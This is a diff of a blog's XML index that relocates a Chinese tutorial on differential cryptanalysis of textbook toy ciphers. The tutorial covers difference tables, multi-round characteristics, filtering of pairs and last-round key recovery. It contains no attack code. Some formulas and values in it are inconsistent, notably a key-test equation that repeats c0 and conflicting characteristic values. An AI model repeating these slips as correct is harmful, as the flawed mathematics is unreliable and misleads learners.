+(0,0,0,f)\stackrel{S}{\rightarrow}(0,0,0,d)</script><p>但是，一个好的$P[·]$置换，会将差分传递到下一轮尽量多的$S[·]$，比如采用 $MDS$ 矩阵的$P[·]$，见<a href="https://blog.nowcoder.net/n/0fbe211a2ff74f00bb960825947903ae">$Matrix\ Branch\;and\;MDS$</a>。即使不考虑$P[·]$有足够好的扩散性能，其也可以将差分特征扩散，比如：</p>
+<script type="math/tex; mode=display">
+(0,0,0,d)\stackrel{P}{\rightarrow}(1,1,0,1)</script><p>所以上面整个过程描述下来就是：</p>
+<script type="math/tex; mode=display">
+(0,0,0,f)\stackrel{\mathcal{R}}{\rightarrow}(1,1,0,1)</script><p>因为这是整个一轮，所以其整个过程的概率就是$\frac{10}{16}$.</p>
+<p>继续考虑第二轮，通过表 $Table\;6.2$ 可以看到，$(1,1,0,1)$ 存在差分的三位再经过一次 $S[·]$ 的输出差分特征以概率$(\frac{6}{16})^3$存在（*因为每个输入差分1到输出差分2的特征概率都是$\frac{6}{16}$，所以将其概率相乘才是总体输出差分为$(2,2,0,2)$的概率）且差分特征描述为：</p>
+<script type="math/tex; mode=display">
+(1,1,0,1)\stackrel{\mathcal{S}}{\rightarrow}(2,2,0,2)</script><p>经过一次 $P[·]$ 置换，以概率 1 获得差分$(0,0,d,0)$：</p>
+<center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650375507202/0F3B05EDC47049CEB882AF3A187D174E" width="80%">
+</center>
+
+<script type="math/tex; mode=display">
+(2,2,0,2)\stackrel{\mathcal{S}}{\rightarrow}(0,0,d,0)</script><p>所以，两轮的差分传递描述为：</p>
+<script type="math/tex; mode=display">
+\begin{align}
+(0,0,0,f)\stackrel{\mathcal{R_1}}{\rightarrow}(1,1,0,1)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,d,0)
+\end{align}
+\tag{inherited\;path}</script><p>计算总概率，第一轮概率是 $\frac{10}{16}$，第二轮概率是$(\frac{6}{16})^3$，乘在一起得到 $\frac{10}{16} * (\frac{6}{16})^3=\frac{135}{4096}$，也就意味着我们在枚举密钥时，已经失去了对于穷举的优势。当然，对于这个例子可能不十分合适去解释，因为其用来 4 个 $S[·]$ ，那就假设每个$S[·]$ 前面使用的都是相同密钥，密钥是 4 位 2 进制，也就共有 $2^4=16$种可能。很显然 $\frac{135}{4096}$ 要小于 $\frac{1}{16}$ ，所以对两轮$CIPHER-4$的差分分析失去了消除噪声的优势。</p>
+<p>考虑一下原因，很自然的想到，$P[·]$ 是影响该结构差分传播的一个大问题，在第 2 轮时由于差分特征被 $P[·]$ 扩散开，所有就产生了三条路径，而计算时需要将三条路径的概率相乘，也就造成了经过两轮后差分特征概率变得如此低。同时，在第一轮输入开始就以我们预像的最大差分概率来构造差分，并将其注入明文来构造明文对，这种方法可能并不会给我们带来最佳差分路径（概率最高），因为其在前面 $CIPHER-1,2,3$ 中使用的差分特征仅仅对 $S[·]$ 而这里有 $P[·]$，所有我们应该将 $S[·]\;and\;P[·]$ 一起考虑。给出一个例子：</p>
+<script type="math/tex; mode=display">
+(0,0,2,0)\stackrel{S}{\rightarrow}(0,0,2,0)\stackrel{P}{\rightarrow}(0,0,2,0)</script><p>可能这是将差分扩散性作为优先级考虑的一种路径，但这条路径的差分特征概率确实比上面一条更高，通过表$Table\;6.2$发现，差分特征概率为$\frac{6}{16}$,为一轮的差分特征概率，同时为每一轮的差分特征概率。所有经过 4 轮之后，得到概率为 $(\frac{6}{16})^4$ 的差分特征路径：</p>
+<script type="math/tex; mode=display">
+\begin{align}
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}
+(0,0,2,0)
+\end{align}
+\tag{better\;path}</script><p>以上过程也可以通过寻找满足要求的明密文对来描述，如果要求选择的明密文对对满足在每一轮差分都为一定值,如上面的 $(0,0,2,0)$ ，则在随机密钥的情况下（其实对于我们举例的密码，密钥并没有影响到差分，但为保证其随机性，还是随机选择密钥，选择 5 个种子密钥，没有经过密钥编排，用作 4 轮，每一轮使用一个 4 位 2 进制作为密钥参与密码运算），统计对数并计算平均值，然后与总可能差分数量 $2^16=65536$ 作比，可以得到与计算特征概率几乎相同的结果：</p>
+<center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650442599859/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center>
+
+<p>来比较以下，</p>
+<ul>
+<li>$better\;path$ 的差分特征概率：每一轮的都是 $\frac{6}{16}$ 所有4轮之后概率为 $(\frac{6}{16})^4$</li>
+<li>$inherited\;path$ 的差分特征概率：$\frac{10}{16}<em>(\frac{6}{10})^3</em>\frac{6}{10}*\frac{6}{10}$</li>
+</ul>
+<script type="math/tex; mode=display">
+\begin{align}
+(0,0,0,f)\stackrel{\mathcal{R_1}}{\rightarrow}(1,1,0,1)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,d,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,c,0)\stackrel{\mathcal{R_4}}{\rightarrow}(e,0,0,0)
+\end{align}
+\tag {inherited\;path}</script><p>由上面的对比可以看到，$better\;path$ 拥有更大的差分特征概率。那么考虑以下，在找到 4 轮差分特征之后，是否有相对于穷举的优势来猜第五轮的密钥$k_5$，很明显，$(\frac{6}{16})^4 &lt;\frac{1}{16}$，也就是噪声大于我们猜测的概率。</p>
+<p>这是否意味着差分分析的失败？？（假设上面的$better\;path$ 就是最好的差分特征传播路径）在一定轮数之后就失去了其统计上的意义？？可能差分确实在传递到一定论数之后确实会因为特征概率太小而被噪声淹没，但似乎我们漏掉了一些使概率放大的办法…</p>
+<h3 id="DC-with-Differential"><a href="#DC-with-Differential" class="headerlink" title="DC with Differential"></a>DC with Differential</h3><h4 id="Different-path-to-same-destination"><a href="#Different-path-to-same-destination" class="headerlink" title="Different path to same destination"></a>Different path to same destination</h4><p>在我们上面的分析中，计算了每一轮的路径、特征及概率，但对现实使用的密码进行差分分析时，往往不会这样做，因为拿到每一轮的结果过于复杂，往往使用一定工具，如 <a href="https://blog.nowcoder.net/n/fa9ab4fc67614b9388fd8406195cd2e0">MILP</a>，来搜索达到可提供优势的差分路径的最大长度。而该搜索过程也不会考虑中间差分值，仅仅考虑该路径的输入差分和输出差分，中间值都可以为未知，例如对$CIPHER-4$有：</p>
+<script type="math/tex; mode=display">
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}?\stackrel{\mathcal{R_2}}{\rightarrow}?\stackrel{\mathcal{R_3}}{\rightarrow}?\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)
+
+\tag{practice\;path}</script><p>假设我们限制特定的输入输出差分，如都为 $(0,0,2,0)$，那么中间值无论是多少，只要能达到这一点就算做 *优势对*，否则算作 *劣势对*。很自然的想到，经过 4 轮且满足条件：输入差分为$(0,0,2,0)$且输出差分为$(0,0,2,0)$ 的优势对远远不止中间值$better\;path$所示的那些，我们将优势对构成的路径记为 $Adv\;paths$：</p>
+<script type="math/tex; mode=display">
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
+*Adv\;path\;_1*\\
+
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,0,1)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
+*Adv\;path\;_2*\\
+
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
+*Adv\;path\;_3*\\
+
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}(0,0,2,0)\stackrel{\mathcal{R_2}}{\rightarrow}(0,0,0,2)\stackrel{\mathcal{R_3}}{\rightarrow}(0,0,1,0)\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;\;
+*Adv\;path\;_4*</script><p>可以查表$Table\;6.2$可以验证以上$Adv\;paths$，及查询其特征概率，均为$(\frac{6}{16})^4$ ,所以将其特征概率相加得到 $4*(\frac{6}{16})^4=\frac{81}{1024}$ ，而 $\frac{81}{1024} &gt; \frac{1}{16}$，所以，在不考虑路径中间差分值的时候，差分攻击对分析 4 轮 $CIPHER-4$，来猜测第五轮密钥 $k_5$ 时是有一定优势的。在实践的差分分析中，我们往往也是采用这种办法。</p>
+<p>同样的，类似 $ Fig.\;6.7$ 的描述方式如下：明显的，忽略了中间差分值，使优势对的数量提升了，这对应差分特征概率的提升。</p>
+<center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650442831543/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center>
+
+<h4 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h4><p>所谓差分密码分析，即识别发生差异的统计特性异常分布，产生比被我们称作噪声的枚举概率更高的猜测概率，从而使我们在猜测时，正确的数据能够从海量的数据中凸显出来，而非被其淹没。</p>
+<p>在前面已经介绍了将差分特征概率尽量提高的办法（当然还会有其他更有效的办法），那现在该把关注点放在猜测密钥上。</p>
+<p>回顾下前面整个过程：</p>
+<ol>
+<li>建$DDT$表并通过密码结果找出最佳差分路径，记录每一轮都满足差分路径的*数据*（明文1：密文1，明文2：密文2 为一对），例子中大概有1296对；</li>
+<li>只考虑输入差分和输出差分，而不需要在每一轮都满足差分路径以提高差分特征概率，将同时满足输入差分和输出差分的数据记录下来，例子中大概有 5310 对；</li>
+<li>枚举所有密文（全空间）因为寻找的差分路径是在一定概率下成立的，所有需要枚举所有密文，才能利用到差分提供的优势（才能达到使正确密钥凸显出的数据量）</li>
+</ol>
+<p>按照这个过程，我们将在最后一轮对每个密文，如果密码设计足够好的话会有 $2^{16}=65536$ 个，考虑对的话就是 $A^2_{65536}$，这将是很庞大的数据量，且对每一对密文都需要枚举 $2^{16}$ 个密钥，与构造的区分器进行对比。显然，虽然我们通过忽略中间差分路径取值来提高了特征概率，但在枚举猜密钥的过程中仍然需要很高的复杂度。</p>
+<p>所有，需要考虑将密文对筛掉一些，只留下满足条件的密文对，在第四轮之后，得到的差分值为$(0,0,2,0)$，通过查表 $Table\;6.2$ 可得，该差分经过一次 $S[·]$ 得到的值可能为 $(0,0,h,0)$ 其中 $h\in{\{1,2,9,a\}}$，而最后一轮没有 $P[·]$ ，那么对所有密文，我们需要留下的仅仅是满足条件：</p>
+<ol>
+<li><p>输入差分为$(0,0,2,0)$的明文加密所得；</p>
+</li>
+<li><p>在 1. 的基础上，将差分的第 0，1，3 半字节位不为全零，且第 2 半字节位不等于 ${\{1,2,9,a\}}$ 的密文对筛掉。</p>
+</li>
+</ol>
+<p>将所以符合上述条件的密文对记录下来，上述例子中大概有 7387 对，也就是说我们仅仅需要对 7387 个密文对，枚举所有可能的最后一轮密钥，这就将数据量降下来很多，同时，找到正确密钥的概率变为 $\frac{5310}{7387} \approx 70\%$  ,使用未经过筛选的密文对猜密钥，得到正确的概率是 $\frac{5310}{56636} \approx 8\%$，可见，筛选给猜密钥提供了很大的优势。书中给出的解释：</p>
+<p><center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650456161985/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center></p>
+<h4 id="Key-Recovery"><a href="#Key-Recovery" class="headerlink" title="Key Recovery"></a>Key Recovery</h4><p>在 4 轮之后，差分传递的特征及其概率如下：</p>
+<script type="math/tex; mode=display">
+(0,0,2,0)\stackrel{\mathcal{R_1}}{\rightarrow}?\stackrel{\mathcal{R_2}}{\rightarrow}?\stackrel{\mathcal{R_3}}{\rightarrow}?\stackrel{\mathcal{R_4}}{\rightarrow}(0,0,2,0)
+\tag{practice\;path}</script><p>概率为 $\frac{5310}{65536} \approx(\frac{6}{16})^4\approx0.08$，而筛选之后剩余的对的概率为 $\frac{7387}{65536} \approx0.11$，筛选出的对中可以用来求出正确密钥的对的比率为 $\frac{5310}{7387}\approx0.7$.那么，给出一个例子，如果我们有总共 $t$ 个对，筛选后留下的对为 $t\times0.11$ 个，可能满足条件的对为 $t\times0.08$ 个。比如 $t=500$ ，则会筛选出 $55$ 个满足差分特征的对，其中有 $40$ 个是由正确的最后一轮密钥加密所得，$15$ 个为无用对。为什么会有一部分无用对留下？我们筛选留下的是明文差分且密文差分都满足条件的对，而在密文位置满足差分特征的对往回推并不一定能够得到区分器末尾（例子第四轮后）的差分值。</p>
+<p><center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220420/629760107_1650463751096/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center><br>简单陈述这个过程存在的缺陷：</p>
+<ol>
+<li><p>我们只能通过对比，确切的猜出不为零的第 2 个半字节位，即 4 个 $bits$，记作目标比特 $target\;bits$ ，但其他 3 个半字节位由于没有穷尽所有可能的结果，所有无法确定其值。这并未达到分析的目的，甚至连一轮密钥都没有获取到。需要恢复更多 $bits $，需要重复该过程来恢复全 $bits$ 的密钥。</p>
+</li>
+<li><p>每次只能恢复一轮的密钥，想要恢复更多轮，可能需要更多次的重复上述过程，或者根据密钥编排算法来推所有密钥。（往往是拿到足够多轮次的密钥之后再根据密钥编排算法推）</p>
+</li>
+</ol>
+<p>*差分分析中，获得了一部分密钥 $bits$ 之后，会大大提高恢复其余更多 $bits$ 的难度。</p>
+<script type="math/tex; mode=display">
+The\;end</script>]]></content>
+      <categories>
+        <category>Cryptanalysis</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -1034,278 +1294,6 @@ $$
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>Differential Cryptanalysis</title>
-    <url>/2022/05/25/Cryptanalysis/%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<p><em>有些地方没渲染出来，以后注意</em></p>
-<h1 id="Differential-Cryptanalysis"><a href="#Differential-Cryptanalysis" class="headerlink" title="Differential Cryptanalysis"></a>Differential Cryptanalysis</h1><h3 id="DC-to-ToyCipher"><a href="#DC-to-ToyCipher" class="headerlink" title="DC to ToyCipher"></a>DC to ToyCipher</h3><center>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650188144391/B9FB9D37BDF15A699BC071CE49BAEA53" width="30%">
-</center>
-
-<h4 id="CIPHER-1"><a href="#CIPHER-1" class="headerlink" title="CIPHER-1"></a>CIPHER-1</h4><p>以一个$toycipher$为例：$CIPHER-1$，其中，$S[·]$ 表示一个公开的 $S-Box$ 置换（可逆)</p>
-  <center>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189319128/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-  </center>
-
-<p>在已知明文 $m_{0} \; m_{1}$ ，密文 $c_{0}\;c_{1}$ 的情况下（已知明文攻击），加密过程如下：</p>
-<p>(已知：$m_{0} \; m_{1}\; c_{0}\;c_{1} ;$<br>未知：$k_{0}\;k_{1}\;u\;v)$</p>
-<center>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650186751354/D2B5CA33BD970F64A6301FA75AE2EB22" width="60%">
-  </center>
-
-<p>由于两次加密使用的是相同的密钥 $k_{0}$和 $k_{1}$ ，所以对明文以密码最常用操作( $\bigoplus$ )做差分得到：</p>
-  <center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650186863109/D2B5CA33BD970F64A6301FA75AE2EB22" width="60%">
-  </center>
-
-<p>即，明文$m_{0} \; m_{1}$差分 == 中间状态 $u_{0}, u_{1}$ 的差分，消去了密钥 $k_{0}$ 的影响；</p>
-<p>所以，跳过 $k_{0}$ 的影响，枚举 $k_{1}$ 的候选值，记 $t$，当$ t$ 满足 </p>
-<script type="math/tex; mode=display">
-\textcolor{red}{S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}] == m_{0} \bigoplus m_{1}}</script><p>时，记 $1$ 次有效的 $t$ 计数，当 $t$ 计数足够多时，则认为 $t$ 有很大可能就是$k_{1}$ ，只需验证即可。</p>
-<p>$ Conclusion\underline{ }\;P_1: $</p>
-<ol>
-<li>即使中间数据未知，仍然可以通过寻找已知数据的差异来断定中间数据的差异；</li>
-<li>差分分析的一种方法(init) ，通过寻找确定的一部分中间状态数据，穷举另一部分未知数据来恢复密钥。</li>
-</ol>
-<p>下面是一个具体的分析的例子:</p>
-  <center>
- <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189084066/D2B5CA33BD970F64A6301FA75AE2EB22">
-  </center>
-
-  <center>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189139457/D2B5CA33BD970F64A6301FA75AE2EB22">
-  </center>
-
-
-<p>简单解释一下以上例子的过程：（已知明文攻击）</p>
-<ol>
-<li><p>选择两对明密文，根据上面推出的公式：中间值差分$(u_{0}\bigoplus u_1)==$ 明文差分 $(m_{0} \bigoplus m_{1})$，计算出$u_{0} \bigoplus u_{1}$的值;</p>
-</li>
-<li><p>计算出$S[·]$的逆$S^{-1}[·]=R[·]$，用来计算核心推导式;</p>
-</li>
-<li><p>穷举所有的 $k_{1}= t$,根据式：$S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}]$计算出中间值差分;</p>
-</li>
-<li><p>将3.中的结果与2.中的结果匹配，对可能使等式$S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}] == m_{0} \bigoplus m_{1}$成立的t计数（或存到一个集合中）需要注意使成立的t值可能<font color = purple>不唯一</font>，这就涉及到差分概率，后面再说;</p>
-</li>
-<li><p>为了找出唯一的$t=k_{1}$，需要更多的明密文对来重复上述1.2.3.4.过程;</p>
-</li>
-<li><p>将多个明密文对产生的可能$t=k_{1}$结果取交集，直到得到最后的唯一的结果，即可以断定其为正确的$k_{1}$</p>
-</li>
-</ol>
-  <center>
-<br>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650203196847/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-  <br>
-  </center>
-
-<h4 id="CIPHER-2"><a href="#CIPHER-2" class="headerlink" title="CIPHER-2"></a>CIPHER-2</h4><p>下面考虑一个更复杂的例子，假设$Cipher-2$有两个$S$盒及$3$个密钥：</p>
-<center>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650203999365/757C75C2BC7E2D8D9493B7FD3FD6BF1F" width="80%">
-</center>
-
-<p>明显，在以上例子中，虽然有关系 $m_{0} \bigoplus m_{1}$，但无法通过$S[·]$的逆找到中间值$w$和$v$，因为再往前传递数据的过程中，$S[·]$会消去已部分差分关系（当然，不是完全消去）</p>
-<p>那么，就需要更进一步的考虑$S$盒对该差分传递的影响</p>
-<p>下面做一个小测试，考虑两个相同$S$盒的输出差分:<br>取i,j分别为进入两个S盒的数据，且i是j的补，即$j=i \bigoplus f$，则有下表$<br></p>
-<blockquote>
-<p><strong>#小知识：二进制数据$i$的补$==i\bigoplus F_{16} ==i\bigoplus \vec{1}$</strong></p>
-</blockquote>
-<p>按照$CIPHER-1$的办法无法获取中间值$v$和$w$，因为经过了非线性的$S$盒，$\bigoplus $的差分无法被传递下去；<br>所以选定明文 $i$，和通过明文 $i$ 可以推出的明文 $j$ ，并将其分别进入 $S$ 盒，拿到其输出 $S$ 盒的差分，建立下表：</p>
-<center>
-  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650205129825/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center>
-
-
-<p>通过上面发现，在第五列，$d$ 出现的频率更高   ，下面给出以上由 $i$ 到 $j$ 到 $S[i] \bigoplus S[j]$ 的推导过程：</p>
-<script type="math/tex; mode=display">
-i(i.e. message\;or\;plaintext) \rightarrow i \bigoplus F = S[i] \bigoplus S[j]</script><p>所以，我们只需要有一个明文 $i$ 即可；</p>
-<p>根据对 $CIPHER-1$ 的攻击可以知道，$m_{0}\bigoplus m_{1} == u_{0} \bigoplus u_{1} == F$,所以有：*当两个异或等于 $ F $ 的值分别进入该 $ S $ 盒，会有$ \frac{10}{16} $的概率得到输出差分 $ d$ ；</p>
-<p>同时，通过猜测$ k_{2} $可以得到 $w$ 位置的差分，而 $w$ 位置的差分又等于 $v$ 位置的差分。</p>
-<p><strong>所以得到结论：</strong></p>
-<p>通过选择两个输入差分为 F 的明文产生密文（并不是选择明文攻击），猜测 $k_{2}$ 从反向在中间进行对比，如果差分数据十分随机，则猜测的 $k_{2}$ 不对，如果猜测 $k_{2}$ 使得在中间 $v_{0}\bigoplus v_{1}$ 为 $d$，则很大可能猜测的 $k_{2}$ 正确。</p>
-<p>那么更进一步，对任何一对”选择”的明密文，猜测 $k_{2}$ ，并将所有 $k_{2}$ 的猜测记在$hash$表中，如果 $k_{2}$ 使得中间的差分 $ v_{0}\bigoplus v_{1} = $差分分布表中频率出现最高的数据（如 $Table\;6.1$ 的 $d$），则将该$hash$表中对于的 $k_{2}$ 的位置计数 $+1$.(*逆向推 $k_{2}$ 的过程中，正确的 $k_{2}$ 将会使中间值差分出现的频率远高于其他值出现的频率，如上图 $v_{0} \bigoplus v_{1}=d$ 概率为 $ \frac{10}{16} $,而其他为$ \frac{1}{16} $.</p>
-<p>以上的寻找输入差分 $d_{in}$ 及其经过两个 $S-Box$ 之后的输出差分 $d_{out}$ 的值可以建一个差分表 $\textcolor{red}{DDT}$  ,如下：</p>
-<p>从下图可以看出，当输入差分为$f$时，输出差分为$d$出现的频率最高次数为10，所以选择差分 $f$ 从 $plaintext$ 注入，获得一条差分概率最大的路径，概率为$\frac{10}{16}$,路径为$f\rightarrow d$. </p>
-<p><img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650360923811/D2B5CA33BD970F64A6301FA75AE2EB22" alt="img"></p>
-<p>对 $CIPHER-2$ 的分析让我们发现了 $S[·]$ 的一些规律，比如：</p>
-<ul>
-<li>如果两对差分输入位上均不同，如 $0001\;and\;1110$，观察上表的 $1\;and\;e$ ，输出差分在各位也均不同；</li>
-<li>在所有位位置不同的十对输入将产生除了第二个最低有效位位置之外的所有不同的输出对；</li>
-<li>$and\;so\;on\;and\;so\;forth$</li>
-</ul>
-<p>那么，如果一对输入输出差分$(\alpha,\beta)$，即输入差分 $\alpha$ 通过 $S[·]$ 可以得到输出差分 $\beta$ ,则称该过程为通过操作 $S[·]$ 的差分特征 $ (differential) \;characteristic\;across\;the\;operation\;S[⋅]$ 记作$\alpha\;\stackrel{S[·]}{\rightarrow}\;\beta$ ,一个特征成立就有与其对应的概率如 $f\;\stackrel{S[·]}{\rightarrow}\;b$ 的概率为$\frac{10}{16}$.</p>
-<h3 id="DC-using-Characteristic"><a href="#DC-using-Characteristic" class="headerlink" title="DC using Characteristic"></a>DC using Characteristic</h3><h4 id="CIPHER-3"><a href="#CIPHER-3" class="headerlink" title="CIPHER-3"></a>CIPHER-3</h4><p>有了上面的规律，可以考虑一个更加复杂的$ToyCipher$：$CIPGERTHREE$在$CIPHER-2$的基础上，又多加了一个$S[·]$及一个密钥$k_3$</p>
-<center>
-<img src="https://uploadfiles.nowcoder.com/images/20220418/629760107_1650291467544/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center>
-
-<p>有了对$CIPHER-2$的分析方法，对$CIPHER-3$分析就容易理解多了：如果考虑通过一个$S[·]$，则给定差分 $f$ 会得到差分 $d$ 的概率时 $\frac{10}{16}$；那么，考虑差分继续往后传播，到第二个$S[·]$，通过查表 $Table 6.2$ 可以得知，概率最高的是特征 $d\;\stackrel{S[·]}{\rightarrow}\;c$，概率为 $\frac{6}{16}$，也就是说，如果我们希望能够通过”猜密钥”的方式（或者是枚举）得到密钥 $k_3$ ，就需要经过两个 $S[·]$ ，而带来的影响是，差分概率降低（<em>我们选取的是差分概率最高的一条特征路径）。很自然的，我们把通过两个$S[·]$的差分特征概率乘起来 $\frac{10}{16}  </em> \frac{6}{16}=\frac{15}{64}$，也就是说，我们猜出正确的$k_3$的概率是$\frac{15}{64}$,但这也是很大的降低了噪声对我们猜测密钥的影响，因为随机猜测密钥的。</p>
-<h4 id="CIPHER-4"><a href="#CIPHER-4" class="headerlink" title="CIPHER-4"></a>CIPHER-4</h4><p>$CIPHER-4$已经十分类似我们现在使用的分组密码（见 $AES$ 算法 $Rijndael$）：使用 $r$ 轮加密，对 $16-bit\;block$ 操作，所有的 $r+1$ 轮的密钥都随机均匀选取，每一轮包含结构 $S[·]\;and\;P[·]$ （都可逆）见下图：</p>
-<p><em>其中，每一轮的输入为 $16-bit$ ，被分为 $4 </em> 4-bit$ 的四个半字节放入 $4 <em> S[·]$ 和 $P[·]$ 中运算，也就是说 $S[·]\;and\;P[·]$ 都是在 $\{0,1\}^4\;\rightarrow(0,f)$ 上的置换</em></p>
-<p>4 轮的 $CIPHER-4$ 实现了充分的扩散（雪崩），这得益于$P[·]$的设计；</p>
-<p>除 $S[·]$ 外，其余运算对二进制上的加法 $\bigoplus$ 均是线性的，$P[·]$ 运算可以用一个线性的矩阵表示；</p>
-<center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650357183268/D2B5CA33BD970F64A6301FA75AE2EB22" width = "80%">
-</center>
-<center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650357308008/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
-</center>
-
-<p>下面，考虑对$CIPHER-4$分析，继承对$CIPHER-3$的分析方法，寻找前 $r-1$ 轮的差分特征，猜第 $r$ 轮使用的密钥 $k_r$，由于有 4 个 $S[·]$ 所以将差分特征表示为：</p>
-<script type="math/tex; mode=display">
-(\alpha_1,\alpha_2,\alpha_3,\alpha_4)\stackrel{S}{\rightarrow}(\beta_1,\beta_2,\beta_3,\beta_4)</script><p>还有一个 $P[·]$ 作用在 $S[·]$ 之后，而 $P[·]$ 不会影响差分值，只会影响其在下一轮出现的位置， $P[·]$的作用是将差分传播到尽可能多的  $S[·]$ 中，将 $P[·]$过程表示为：</p>
-<script type="math/tex; mode=display">
-(\beta_1,\beta_2,\beta_3,\beta_4)\stackrel{P}{\rightarrow}(\gamma_1,\gamma_2,\gamma_3,\gamma_4)</script><p>所以，$\beta_1||\beta_2||\beta_3||\beta_4$ 就表示输入差分经 $S[·]$ 之后的输出差分，$\gamma_1||\gamma_2||\gamma_3||\gamma_4$ 表示输出差分经 $P[·]$之后该轮最后的输出差分，所以一轮的差分总体表示为：</p>
-<script type="math/tex; mode=display">
-(\alpha_1,\alpha_2,\alpha_3,\alpha_4)\stackrel{\mathcal{R}}{\rightarrow}(\gamma_1,\gamma_2,\gamma_3,\gamma_4)</script><p>通过表$Table\;6.2$ 可以发现，如果输入 $S[·]$ 的差分为 0，则输出差分也为 0 ，所以对于 $16-bit\;block$，可以以没半个字节为单位，构造只在一位（一个 $S[·]$ 输入差分）为非零值的数据。当然，这在分析上是允许的，但变成了*选择明文攻击，因为明文是我们自己构造的。在考虑$S[·]$的活跃性时，相当于构造只有一个$S[·]$活跃的轮。构造的输入差分例如$(0,0,1,0)$，每一个位置进入一个$S[·]$，那么至少在第一轮只有一个$S[·]$的输出会存在差分。</p>
-<p>再考虑到前面对$CIPHER-1,CIPHER-2$分析的时候，得到一个$S[·]$ 存在最大的差分特征 $f\;\stackrel{S[·]}{\rightarrow}\;b$ ，概率为$\frac{10}{16}$，所以将输入差分令为$(0,0,0,f)$，那么对第一轮，就只有第四个$S[·]$ 存在差分，描述经过一轮差分的传递：</p>
-<script type="math/tex; mode=display">
-(0,0,0,f)\stackrel{S}{\rightarrow}(0,0,0,d)</script><p>但是，一个好的$P[·]$置换，会将差分传递到下一轮尽量多的$S[·]$，比如采用 $MDS$ 矩阵的$P[·]$，见<a href="https://blog.nowcoder.net/n/0fbe211a2ff74f00bb960825947903ae">$Matrix\ Branch\;and\;MDS$</a>。即使不考虑$P[·]$有足够好的扩散性能，其也可以将差分特征扩散，比如：</p>
-<script type="math/tex; mode=display">
-(0,0,0,d)\stackrel{P}{\rightarrow}(1,1,0,1)</script><p>所以上面整个过程描述下来就是：</p>
-<script type="math/tex; mode=display">
-(0,0,0,f)\stackrel{\mathcal{R}}{\rightarrow}(1,1,0,1)</script><p>因为这是整个一轮，所以其整个过程的概率就是$\frac{10}{16}$.</p>
-<p>继续考虑第二轮，通过表 $Table\;6.2$ 可以看到，$(1,1,0,1)$ 存在差分的三位再经过一次 $S[·]$ 的输出差分特征以概率$(\frac{6}{16})^3$存在（*因为每个输入差分1到输出差分2的特征概率都是$\frac{6}{16}$，所以将其概率相乘才是总体输出差分为$(2,2,0,2)$的概率）且差分特征描述为：</p>
-<script type="math/tex; mode=display">
